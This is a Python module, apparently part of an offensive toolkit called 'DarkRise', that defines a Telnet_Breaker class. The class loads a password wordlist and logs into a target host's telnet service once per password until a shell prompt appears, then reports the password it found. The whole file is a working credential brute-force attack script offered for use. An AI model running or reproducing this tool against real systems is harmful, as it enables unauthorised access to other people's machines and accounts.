from core.DarkRiseSettings import DarkRiseSettings
from termcolor import colored
import telnetlib
import subprocess
import sys
import socket

class Telnet_Breaker(DarkRiseSettings):
    def __init__(self, username, ipaddr, port, wordlist):
        super().__init__()
        self.username = username
        self.ip = ipaddr
        self.port = port
        self.wordlist = wordlist

    def Break(self):
        _passwords = []
        try:
            with open(str(self.wordlist), 'r', encoding = 'utf-8') as wordlist:
                _passwords = [_pass.strip() for _pass in wordlist]

        except Exception:
            print("Please Check Out Your Wordlist!")

        subprocess.call("clear")
        self.logo()

        for telnetpass in _passwords:
            if self.port is None:
                self.port = 23

            print(f"{self.username}@{self.ip} {self.port} : {telnetpass}")
            
            tn = telnetlib.Telnet(self.ip)

            try:
                tn.read_until(b"login: ")
            except EOFError:
                print("Authentication failed.")

            try:
                tn.write(f"{self.username}\n".encode("utf-8"))
            except socket.error as e:
                print("Username Write Failed!")

            if telnetpass:
                try:
                    tn.read_until(b"Password:")
                except EOFError:
                    print("Password Read Failed!")

                try:
                    tn.write(f"{telnetpass}\n".encode("utf-8"))
                except socket.error as e:
                    print("Password Write Failed!")

                try:
                    (i, obj, byt) = tn.expect([b"incorrect", b"@"], 2)
                except EOFError:
                    print("[-] Error Happend Please Check Out Your Settings Or Network Connection!")
                
                if i == 1:
                    print(colored(f"Found Password: {telnetpass}", "green", attrs=["bold"]))
                    break
                else:
                    print("Authentication failed.")
                tn.close()